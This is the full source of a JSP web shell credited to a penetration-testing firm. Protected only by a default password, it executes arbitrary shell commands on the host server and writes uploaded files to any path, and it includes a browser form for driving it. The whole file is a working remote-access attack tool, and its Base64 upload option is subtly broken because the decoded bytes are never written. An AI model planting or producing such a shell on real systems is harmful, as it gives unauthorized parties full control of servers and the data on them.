<%@ page import="java.util.*,java.io.*,java.net.*,sun.misc.BASE64Decoder"%>
<%
    /*
    ######################################
    #                                    #
    #  RedTeam Pentesting GmbH           #
    #  kontakt@redteam-pentesting.de     #
    #  http://www.redteam-pentesting.de  #
    #                                    #
    ######################################
    */

/*
=====================
= RedTeam JSP Shell =
=====================

This JSP script either runs arbitrary commands on the host it is installed to or
accepts fileuploads via http and writes them to the local filesystem.
It takes four parameters:

HTTP-Get
--------

  Mandatory
  ---------
  pass: A password set in this file (see the "User Config" section below) which
        must be provided in order to be allowed to run a command. Please be aware that
        you'll send this in cleartext if the website does not support HTTPS! It's only
        meant as a rudimental protection against misuse of the script by third parties.

  Optional
  --------
  cmd:  The command to execute. If it's empty, nothing will happen.
  b64:  If set to any value, the parameter 'cmd' has to be Base64 encoded. This
        avoids problems with special characters in commands.
  html: If set to any value, the website returned will contain a little textfield
        and submit button allowing to run a command conveniently from your browser.

HTTP-Post
---------
  The script accepts multipart/form-data uploads

  Mandatory
  ---------
  pass: A password, see description above

  Optional
  --------
  uploadfile:  The file to upload. If it's empty, nothing will happen.
  filepath:    The path where to write the file to. If it's empty, the
               file will be saved in the current working directory of the
               webserver and the original filename will be used.
  b64:         If set to any value, the content of the 'uploadfile' has to be
               Base64 encoded and will be Base64 decoded before writing to
               the local filesystem. Don't try to upload binary files without
               this.


Examples
--------
https://www.example.com?pass=secret&cmd=id
https://www.example.com?pass=secret&cmd=aWQK&b64=true
https://www.example.com?pass=secret&html=true
*/

/* User Config Start */
    String pass = "secret";
/* User Config End */

    String cmd;
    String[] cmdary;
    String OS = System.getProperty("os.name");

    String html_header = "<html>\n"
            + "<body>\n"
            + "Enter command:\n"
            + "<form method=\"GET\" name=\"cmdform\" action=\"\">\n"
            + "<input type=\"text\" width=\"50\" name=\"cmd\">\n"
            + "<input type=\"hidden\" name=\"html\" value=\"true\">\n"
            + "<input type=\"hidden\" name=\"pass\" value=\"" + URLEncoder.encode(pass) + "\">\n"
            + "<input type=\"submit\" value=\"Run\">\n"
            + "</form>\n"
            + "<form method=\"POST\" name=\"fileform\" enctype=\"multipart/form-data\" action=\"\">\n"
            + "Enter File to upload:<br />\n"
            + "<input type=\"file\" name=\"uploadfile\"><br />\n"
            + "Enter Path to save file:<br />\n"
            + "<input type=\"text\" name=\"filepath\"><br />\n"
            + "base64-decode file before saving:<br />\n"
            + "<input type=\"checkbox\" name=\"b64\"><br />\n"
            + "<input type=\"submit\" value=\"Upload\">\n"
            + "</form>\n"
            + "<pre>\n";

    String html_footer = "</pre>\n"
            + "</body>\n"
            + "</html>\n";

    if (request.getParameter("pass") != null) {
        if (URLDecoder.decode(request.getParameter("pass")).equals(pass)) {
            if (request.getParameter("html") != null) {
                out.println(html_header);
            }
            if (request.getParameter("cmd") != null) {
                if (request.getParameter("b64") != null) {
                    BASE64Decoder decoder = new BASE64Decoder();
                    cmd = new String (decoder.decodeBuffer(request.getParameter("cmd")));
                }
                else {
                    cmd = new String (request.getParameter("cmd"));
                }
                if (OS.startsWith("Windows")) {
                    cmdary = new String [] {"cmd", "/C", cmd};
                }
                else {
                    cmdary = new String [] {"/bin/sh", "-c", cmd};
                }
                Process p = Runtime.getRuntime().exec(cmdary);
                OutputStream os = p.getOutputStream();
                InputStream in = p.getInputStream();
                DataInputStream dis = new DataInputStream(in);
                String disr = dis.readLine();
                while ( disr != null ) {
                    out.println(disr);
                    disr = dis.readLine();
                }
            }
            String contentType = request.getContentType();
            if ((contentType != null) && (contentType.indexOf("multipart/form-data") >= 0)) {
                DataInputStream in = new DataInputStream(request.getInputStream());
                int formDataLength = request.getContentLength();
                byte dataBytes[] = new byte[formDataLength];
                int byteRead = 0;
                int totalBytesRead = 0;
                while (totalBytesRead < formDataLength) {
                    byteRead = in.read(dataBytes, totalBytesRead, formDataLength);
                    totalBytesRead += byteRead;
                }
                String formdata = new String(dataBytes);
                String boundary = formdata.substring(0,formdata.indexOf("\n", 0) - 1);

                String content = "";
                int bpos = -1;
                int contentdispositionlinestart = -1;
                int contentdispositionlineend = -1;
                String contentdispositionline;
                int contenttypelinestart = -1;
                int contenttypelineend = -1;
                String contenttypeline;
                int posfilenamestart = -1;
                int posfilenameend = -1;
                int posnamestart = -1;
                int posnameend = -1;
                int endbpos = -1;
                String filename = "";
                String filepath = "";
                String file = "";
                String name = "";
                String b64 = "";
                bpos = formdata.indexOf(boundary);
                do {
                    if (bpos < formdata.length()) {
                        contentdispositionlinestart= bpos+boundary.length()+2;
                        contentdispositionlineend= formdata.indexOf("\n", bpos+boundary.length()+2)-1;
                        contentdispositionline= formdata.substring(contentdispositionlinestart, contentdispositionlineend);
                        if (contentdispositionline.indexOf("Content-Disposition:")>=0) {
                            posfilenamestart = contentdispositionline.indexOf("filename=\"");
                            if (posfilenamestart >= 0) {
                                posfilenamestart = posfilenamestart+10;
                                posfilenameend = contentdispositionline.indexOf('"', posfilenamestart);
                                filename = contentdispositionline.substring(posfilenamestart, posfilenameend);
                                contenttypelinestart= contentdispositionlineend+2;
                                contenttypelineend= formdata.indexOf("\n", contentdispositionlineend+2)-1;
                                contenttypeline= formdata.substring(contenttypelinestart, contenttypelineend);
                                endbpos = formdata.indexOf(boundary, contenttypelineend+1)-1;
                                file=formdata.substring(contenttypelineend+4,endbpos-1);
                            } else {
                                posnamestart = contentdispositionline.indexOf("name=\"")+6;
                                posnameend = contentdispositionline.indexOf('"', posnamestart);
                                name = contentdispositionline.substring(posnamestart, posnameend);
                                endbpos = formdata.indexOf(boundary, contentdispositionlineend+1)-2;
                                content=formdata.substring(contentdispositionlineend+4,endbpos);
                                if (name.equals("filepath")) {
                                    filepath=content;
                                }
                                if (name.equals("b64")) {
                                    b64=content;
                                }
                            }
                        }
                    }
                    bpos = formdata.indexOf(boundary, bpos + boundary.length());
                    if (bpos < 0) { bpos = formdata.length(); }
                } while (bpos + boundary.length() + 2 < formdata.length());

                if (! filename.equals("")) {
                    if (filepath.equals("")) {
                        filepath=filename;
                    }

                    FileOutputStream fileOut = new FileOutputStream(filepath);
                    byte[] filebytes;
                    if (! b64.equals("")) {
                        BASE64Decoder decoder = new BASE64Decoder();
                        filebytes = decoder.decodeBuffer(file);
                    } else {
                        filebytes = file.getBytes();
                    }
                    fileOut.write(file.getBytes());
                    fileOut.flush();
                    fileOut.close();
                    out.println("wrote " + filepath);
                }


            }
            if (request.getParameter("html") != null) {
                out.println(html_footer);
            }
        }
    }

%>
